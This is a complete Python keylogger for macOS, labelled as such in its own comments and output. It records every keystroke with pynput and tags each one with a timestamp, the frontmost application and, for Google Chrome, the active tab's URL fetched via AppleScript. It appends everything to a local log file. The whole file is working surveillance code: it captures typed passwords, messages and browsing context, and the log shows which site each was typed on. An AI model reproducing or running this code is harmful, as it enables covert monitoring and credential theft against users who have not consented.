from pynput import keyboard
from AppKit import NSWorkspace
from datetime import datetime
import subprocess
import os

# Log directory setup
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "key_log.txt")

# Track last active app
last_window = None

# Get active app name
def get_active_app():
    app = NSWorkspace.sharedWorkspace().frontmostApplication()
    return app.localizedName()

# Get active tab URL in Google Chrome using AppleScript
def get_chrome_url():
    try:
        script = '''
        tell application "Google Chrome"
            get URL of active tab of front window
        end tell
        '''
        url = subprocess.check_output(["osascript", "-e", script])
        return url.decode("utf-8").strip()
    except subprocess.CalledProcessError:
        return None

# Get full context: app + url if applicable
def get_active_context():
    app_name = get_active_app()
    if app_name == "Google Chrome":
        url = get_chrome_url()
        return f"{app_name} - {url}" if url else app_name
    else:
        return app_name

# Write to log file
def write_to_file(key, context):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] ({context}) {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] ({context}) [{key}]\n")

# On key press
def on_press(key):
    global last_window
    current_context = get_active_context()

    # Detect app change
    if current_context != last_window:
        with open(log_file, "a") as f:
            f.write(f"\n--- Switched to: {current_context} ---\n")
        last_window = current_context

    print(f"Pressed in {current_context}: {key}")
    write_to_file(key, current_context)

# Run the keylogger
try:
    with keyboard.Listener(on_press=on_press) as listener:
        print("✅ Keylogger is running... Press Ctrl+C to stop.")
        listener.join()
except KeyboardInterrupt:
    print("\n🛑 Keylogger stopped by user.")
    subprocess.call(['open', log_dir])
